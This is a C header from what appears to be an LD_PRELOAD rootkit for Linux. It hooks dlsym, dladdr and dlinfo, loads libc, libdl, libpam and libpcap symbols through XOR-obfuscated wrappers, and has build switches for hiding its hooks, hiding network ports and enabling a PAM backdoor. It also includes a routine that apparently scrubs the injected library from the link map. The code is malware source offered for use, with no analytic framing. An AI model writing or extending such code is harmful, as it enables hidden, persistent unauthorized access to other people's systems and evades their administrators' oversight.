#ifndef LIBDL_H
#define LIBDL_H

#include "util/xor.c"

#define GLIBC_MAX_VER 40

void *libc_handle;
void *libdl_handle;
void *libpam_handle;
#ifdef HIDE_PORTS
void *libpcap_handle;
#endif

extern void *_dl_sym(void *, const char *, void *);
typeof(dlsym) *o_dlsym;

#ifdef HIDE_HOOKS
void *xdlopen(const char *filename);
void get_libc_symbol(const char *symbol, void **funcptr);
void get_libdl_symbol(const char *symbol, void **funcptr);
#endif
#if defined(HIDE_HOOKS) && defined(USE_PAM_BD)
void get_libpam_symbol(const char *symbol, void **funcptr);
#endif

#if defined(HIDE_HOOKS) && defined(HIDE_PORTS)
void get_libpcap_symbol(const char *symbol, void **funcptr);
#endif
void locate_dlsym(void);
void *dlsym(void *handle, const char *symbol);
void get_symbol_pointer(int symbol_index, void *handle);
void _hook(void *handle, ...);
#include "gsym.c"
#define hook(...) _hook(RTLD_NEXT, __VA_ARGS__)
#define call(symbol_index, ...) symbols[symbol_index].func(__VA_ARGS__)
#include "util/xor_wrappers.h"
#include "dlsym.c"

int dladdr(const void *addr, Dl_info *info);
#include "dladdr.c"

void repair_linkmap(void);
int dlinfo(void *handle, int request, void *p);
#include "dlinfo.c"

#endif